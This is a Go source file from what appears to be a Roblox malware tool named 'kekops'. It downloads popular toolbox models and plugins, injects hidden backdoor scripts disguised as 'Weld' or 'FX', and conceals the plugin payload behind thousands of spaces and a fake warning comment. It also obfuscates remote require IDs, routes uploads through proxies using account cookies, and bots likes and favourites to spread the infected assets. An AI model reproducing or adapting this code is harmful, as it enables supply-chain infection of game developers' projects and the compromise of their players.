package core

import (
	"bytes"
	"fmt"
	"github.com/robloxapi/rbxfile"
	"github.com/robloxapi/rbxfile/bin"
	"image"
	"image/draw"
	"io/ioutil"
	. "kekops/ui"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"

	"image/png"
)

var Operations *OperationsManager

type ImportLevel int
type ImportType int

const (
	IMPORT_LEVEL_FRONTPAGE ImportLevel = iota + 1
	IMPORT_LEVEL_TOOLBOX
	IMPORT_LEVEL_BOTH
	IMPORT_MODEL ImportType = iota + 1
	IMPORT_PLUGIN
)

type OperationsManager struct {
	BackdoorScript       string
	BackdoorPluginScript string
	PluginOverlay        image.Image
	RequireTemplate      *rbxfile.Root
}

func (o *OperationsManager) EncodeRequire(id string) string {
	var out string
	var key uint8 = 20
	for n := 0; n < len(id); n++ {
		out += "\\" + strconv.Itoa(int(id[n]-key))
		key = -key
	}
	return out
}

func (o *OperationsManager) IsClassBlacklisted(classname string) bool {
	blacklisted := []string{"TouchTransmitter", "Script", "LocalScript", "Weld", "Motor6D", "RotateP", "ManualWeld", "Camera"}
	for _, cn := range blacklisted {
		if classname == cn {
			return true
		}
	}
	return false
}

func (o *OperationsManager) GenerateRequireModel() []byte {
	//o.RequireTemplate.Instances[0].Set("Source", rbxfile.ValueString([]byte("return require(5245264993)")))
	o.RequireTemplate.Instances[0].Set("Source", rbxfile.ValueString([]byte("return require(8073187766)")))
	out := new(bytes.Buffer)
	err := bin.SerializeModel(out, nil, o.RequireTemplate)
		if err != nil {
			Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Error serializing require template: %v", err))
			return []byte("")
	}

	return out.Bytes()
}


func (o *OperationsManager) GenerateRequire(id int64) []byte {
	//o.RequireTemplate.Instances[0].Set("Source", rbxfile.ValueString([]byte("return require(5245264993)")))
	/*
	o.RequireTemplate.Instances[0].Set("Source", rbxfile.ValueString([]byte("return require(7923735360)")))
	out := new(bytes.Buffer)
	err := bin.SerializeModel(out, nil, o.RequireTemplate)
		if err != nil {
			Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Error serializing require template: %v", err))
			return []byte("")
	}
	 */
	sub := rand.Int63n(5000000000) + 1000000000
	return []byte(fmt.Sprintf(o.BackdoorScript, fmt.Sprintf("%d + %d", sub, id - sub)))
}

func (o *OperationsManager) GetMainModule() string {
	for {
		var lua string
		cookie := CookieManager.Account()
		Console.Log(CATEGORY_OPERATIONS, LOG_TRACE, fmt.Sprintf("Cookie: %s", cookie))
		mm := Proxies[rand.Intn(len(Proxies))].TryRequest(GenerateBotUploadRequireModel(cookie.cookie))
		if id, err := strconv.Atoi(mm); err != nil {
			continue
		} else {
			lua = Proxies[rand.Intn(len(Proxies))].TryRequest(GenerateBotUploadRequire(cookie.cookie, id))
		}
		if lua == "" {
			continue
		}
		if _, err := strconv.Atoi(lua); err == nil {
			Console.Log(CATEGORY_OPERATIONS, LOG_INFO, fmt.Sprintf("Uploaded new MainModule: %s", lua))
			// Get hash
			hash := GenerateHash(lua, cookie.cookie)
			Console.Log(CATEGORY_OPERATIONS, LOG_TRACE, fmt.Sprintf("Hash: %s", hash))
			if hash == "" {
				continue
			}
			Tracker.AddRequire(mm, cookie)
			return hash
		}
		time.Sleep(10000 * time.Millisecond)
	}
}

func (o *OperationsManager) InfectAsset(assetType ImportType, data []byte, mm string) []byte {
	reader := bytes.NewReader(data)
	rbx, err := bin.DeserializeModel(reader, nil)
	if err != nil {
		Console.Log(CATEGORY_OPERATIONS, LOG_INFO, fmt.Sprintf("Failed to deserialize asset: %v", rbx))
		return []byte("")
	}
	log := Console.Log(CATEGORY_OPERATIONS, LOG_INFO, "Finding deepest instance...")
	var deepest = rbx.Instances[0]
	var deepestLevel int
	var recurse func(*rbxfile.Instance, int)
	recurse = func(inst *rbxfile.Instance, level int) {
		if o.IsClassBlacklisted(inst.ClassName) {
			return
		}
		if level > deepestLevel {
			log.Update(fmt.Sprintf("Finding deepest instance... %s", inst.Name()))
			deepest = inst
		}
		for _, cinst := range inst.Children {
			recurse(cinst, level+1)
		}
	}
	for _, instance := range rbx.Instances {
		recurse(instance, -1)
	}
	if deepest == nil {
		return []byte("")
	}
	var backdoor = rbxfile.NewInstance("Script", deepest)
	if backdoor == nil {
		return []byte("")
	}
	backdoor.SetName("FX")
	switch assetType {
	case IMPORT_MODEL:
		backdoor.SetName("Weld")
		backdoor.Set("LinkedSource", rbxfile.ValueBinaryString([]byte(
			fmt.Sprintf("rbxassetid://RobloxVerifiedAsset&hash=%s", mm))))
	case IMPORT_PLUGIN:
		backdoor.Set("Source", rbxfile.ValueString([]byte(fmt.Sprintf(
			`--[[ This module is responsible for generating %s effects. Do not remove or the plugin will break. (Jerome#1018, Plugin Studios) ]] %s %s %s`,
			deepest.ClassName, strings.Repeat(" ", 1000), o.BackdoorPluginScript, strings.Repeat(" ", 10000)))))
	}

	log.Update(fmt.Sprintf("Finding deepest instance... %s [Backdoor Injection Successful](fg:yellow)", deepest.Name()))
	log = Console.Log(CATEGORY_OPERATIONS, LOG_INFO, "Serializing infected asset...")
	out := new(bytes.Buffer)
	err = bin.SerializeModel(out, nil, rbx)
	if err != nil {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Error serializing: %v", err))
		return []byte("")
	}
	return []byte(out.String())
}

func (o *OperationsManager) ImportModel(query string, offset int) {
	log := Console.Log(CATEGORY_OPERATIONS, LOG_INFO, fmt.Sprintf("Querying toolbox asset %s...", query))
	search := <-SearchToolbox(query, 1)
	if search == nil {
		log.Update("[Failed to execute search query.](fg:red)")
		return
	}
	if len(search.Data) == 0 {
		log.Update("[Query returned no results.](fg:red)")
		return
	}
	result := search.Data[0+offset]
	info := <-FetchProductInfo(strconv.Itoa(result.ID))
	log.Update(fmt.Sprintf("[Found toolbox asset %d by %s](fg:green)", result.ID, info.Creator.Name))
	log = Console.Log(CATEGORY_OPERATIONS, LOG_INFO, "Fetching asset...")
	asset := <-FetchAsset(fmt.Sprintf("%d", result.ID))
	if len(asset) == 0 {
		log.Update("[Asset fetch failed.](fg:red)")
		return
	}
	log.Update(fmt.Sprintf("Fetching asset... [%d bytes](fg:green)", len(asset)))
	mm := o.GetMainModule()
	infected := o.InfectAsset(IMPORT_MODEL, asset, mm)
	if len(infected) == 0 {
		return
	}
	importId := query
	if offset > 0 {
		importId += "-" + fmt.Sprintf("%d", offset)
	}
	Tracker.ImportModel(infected, importId, query, info.Name)
}

func (o *OperationsManager) ImportPlugin(id string, overlay bool, name string) {
	Console.Log(CATEGORY_OPERATIONS, LOG_INFO, fmt.Sprintf("Downloading plugin and icon for asset %s...", id))
	asset := <-FetchAsset(id)
	thumbnail := <-FetchAssetThumbnail(id)
	if string(asset) == "" {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, "Failed to download asset.")
		return
	}
	if string(thumbnail) == "" {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, "Failed to download thumbnail.")
		return
	}
	img, err := png.Decode(bytes.NewReader(thumbnail))
	if err != nil {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Unable to load plugin thumbnail: %v", err))
	}
	b := image.Rect(0, 0, 420, 420)
	final := image.NewRGBA(b)
	draw.Draw(final, b, img, image.ZP, draw.Src)
	if overlay {
		draw.Draw(final, o.PluginOverlay.Bounds(), o.PluginOverlay, image.ZP, draw.Over)
	} else {
		//final = (*image.RGBA)(imaging.AdjustBrightness(final, 1))
	}

	buffer := new(bytes.Buffer)
	err = png.Encode(buffer, final)
	if err != nil {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Error encoding new thumbnail: %v", err))
		return
	}
	mm := o.GetMainModule()
	infected := o.InfectAsset(IMPORT_PLUGIN, asset, mm)
	if len(infected) == 0 {
		return
	}
	Tracker.ImportPlugin(infected, buffer.Bytes(), name, id)
}

func (o *OperationsManager) AutoFrontpage(imp Import) {
	if imp.TimeElapsed() >= 86400 || imp.TimeElapsed() <= 0 {

	}
}

func (o *OperationsManager) AutoToolbox(imp Import) {
	if imp.TimeElapsed() >= 21600 || imp.TimeElapsed() <= 0 {

	}
}

func (o *OperationsManager) Start() {
	// Periodically iterate through imports to ensure that they are being botted regularly
	ticker := time.NewTicker(3 * time.Minute)
	for {
		<-ticker.C
		for _, imp := range Tracker.Imports {
			// Toolbox: Re-spam with verified accounts every 6 hours, bot likes/favorites on at least 5 new models
			// Frontpage: Rebot 200k every 24 hours
			switch imp.Mode {
			case IMPORT_LEVEL_BOTH:
				o.AutoFrontpage(imp)
				o.AutoToolbox(imp)
			case IMPORT_LEVEL_TOOLBOX:
				o.AutoToolbox(imp)
			case IMPORT_LEVEL_FRONTPAGE:
				o.AutoFrontpage(imp)
			}
		}
	}
}

func (o *OperationsManager) LoadBackdoor(file string) {
	if data, err := ioutil.ReadFile(file); err != nil {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Unable to load backdoor: %v", err))
	} else {
		o.BackdoorScript = string(data)
		Console.Log(CATEGORY_OPERATIONS, LOG_INFO, "Successfully loaded backdoor.")
	}
	if data, err := ioutil.ReadFile("main.rbxm"); err != nil {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Unable to load require template: %v", err))
	} else {
		read := bytes.NewReader(data)
		if o.RequireTemplate, err = bin.DeserializeModel(read, nil); err != nil {
			Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Unable to load require template: %v", err))
		} else {
			Console.Log(CATEGORY_OPERATIONS, LOG_INFO, "Successfully loaded require template.")
		}
	}
}

func (o *OperationsManager) LoadBackdoorPlugin(file string) {
	if data, err := ioutil.ReadFile(file); err != nil {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Unable to load plugin backdoor: %v", err))
	} else {
		o.BackdoorPluginScript = string(data)
		Console.Log(CATEGORY_OPERATIONS, LOG_INFO, "Successfully loaded backdoor.")
	}
}

func (o *OperationsManager) LoadOverlay() {
	fImg, _ := os.Open("overlay.png")
	defer fImg.Close()
	var err error
	if o.PluginOverlay, err = png.Decode(fImg); err != nil {
		Console.Log(CATEGORY_OPERATIONS, LOG_ERROR, fmt.Sprintf("Unable to load plugin overlay: %v", err))
	}
}

func init() {
	Operations = &OperationsManager{}
}
